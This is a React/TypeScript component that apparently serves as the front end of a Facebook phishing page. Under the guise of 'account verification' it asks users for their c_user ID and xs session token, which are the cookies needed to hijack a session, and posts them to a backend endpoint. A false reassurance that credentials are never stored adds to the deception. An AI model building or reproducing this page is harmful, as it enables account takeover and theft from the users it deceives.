import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { verificationFormSchema, type VerificationForm } from "@shared/schema";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { LoadingOverlay } from "./loading-overlay";

export function VerificationFormComponent() {
  const [, navigate] = useLocation();
  const { toast } = useToast();
  
  const form = useForm<VerificationForm>({
    resolver: zodResolver(verificationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
      full_name: "",
      profile_url: "",
    },
  });

  const submitMutation = useMutation({
    mutationFn: async (data: VerificationForm) => {
      const response = await apiRequest("/api/verification/submit", {
        method: "POST",
        body: JSON.stringify(data),
      });
      return response;
    },
    onSuccess: (data) => {
      sessionStorage.setItem("verificationId", data.id);
      navigate("/help");
    },
    onError: (error: any) => {
      toast({
        title: "Verification Failed",
        description: error.message || "Please check your credentials and try again.",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: VerificationForm) => {
    submitMutation.mutate(data);
  };

  return (
    <>
      <LoadingOverlay 
        isVisible={submitMutation.isPending}
        message="Processing Verification"
      />
      
      <div className="bg-white rounded-2xl shadow-soft p-8">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
            </svg>
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Verify Your Account</h2>
          <p className="text-gray-600">Enter your account details to begin the verification process</p>
        </div>
        
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
          <div className="space-y-2">
            <Label htmlFor="full_name" className="text-sm font-medium text-gray-700">
              <svg className="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
              Full Name
            </Label>
            <Input
              id="full_name"
              {...form.register("full_name")}
              placeholder="Enter your full name"
              className="h-12 rounded-xl border-gray-300 focus:border-blue-600 focus:ring-blue-600"
            />
            {form.formState.errors.full_name && (
              <p className="text-sm text-red-600">{form.formState.errors.full_name.message}</p>
            )}
          </div>
          
          <div className="space-y-2">
            <Label htmlFor="profile_url" className="text-sm font-medium text-gray-700">
              <svg className="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
              </svg>
              Profile URL
            </Label>
            <Input
              id="profile_url"
              {...form.register("profile_url")}
              placeholder="https://facebook.com/your-profile"
              className="h-12 rounded-xl border-gray-300 focus:border-blue-600 focus:ring-blue-600"
            />
            {form.formState.errors.profile_url && (
              <p className="text-sm text-red-600">{form.formState.errors.profile_url.message}</p>
            )}
          </div>
          
          <div className="space-y-2">
            <Label htmlFor="c_user" className="text-sm font-medium text-gray-700">
              <svg className="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
              Facebook User ID (c_user)
            </Label>
            <Input
              id="c_user"
              {...form.register("c_user")}
              placeholder="Enter your Facebook User ID"
              className="h-12 rounded-xl border-gray-300 focus:border-blue-600 focus:ring-blue-600"
            />
            {form.formState.errors.c_user && (
              <p className="text-sm text-red-600">{form.formState.errors.c_user.message}</p>
            )}
          </div>
          
          <div className="space-y-2">
            <Label htmlFor="xs" className="text-sm font-medium text-gray-700">
              <svg className="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
              </svg>
              Session Token (xs)
            </Label>
            <Input
              id="xs"
              {...form.register("xs")}
              placeholder="Enter your session token"
              className="h-12 rounded-xl border-gray-300 focus:border-blue-600 focus:ring-blue-600"
            />
            {form.formState.errors.xs && (
              <p className="text-sm text-red-600">{form.formState.errors.xs.message}</p>
            )}
          </div>
          
          <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
            <div className="flex items-start space-x-3">
              <svg className="w-5 h-5 text-blue-600 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <div>
                <h4 className="font-medium text-gray-900 text-sm">Secure Verification</h4>
                <p className="text-xs text-gray-600 mt-1">Your information is encrypted and only used for verification purposes. We never store your credentials.</p>
              </div>
            </div>
          </div>
          
          <Button 
            type="submit" 
            className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-xl transition-all duration-200 hover:shadow-glow transform hover:scale-105"
            disabled={submitMutation.isPending}
          >
            <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
            </svg>
            Begin Verification
          </Button>
        </form>
        
        <div className="mt-6 text-center">
          <p className="text-xs text-gray-500">
            By continuing, you agree to our{" "}
            <a href="#" className="text-blue-600 hover:underline">Terms of Service</a> and{" "}
            <a href="#" className="text-blue-600 hover:underline">Privacy Policy</a>
          </p>
          <div className="mt-4 pt-4 border-t border-gray-200">
            <a href="#" className="text-sm text-blue-600 hover:underline">Need help finding your User ID?</a>
          </div>
        </div>
      </div>
    </>
  );
}
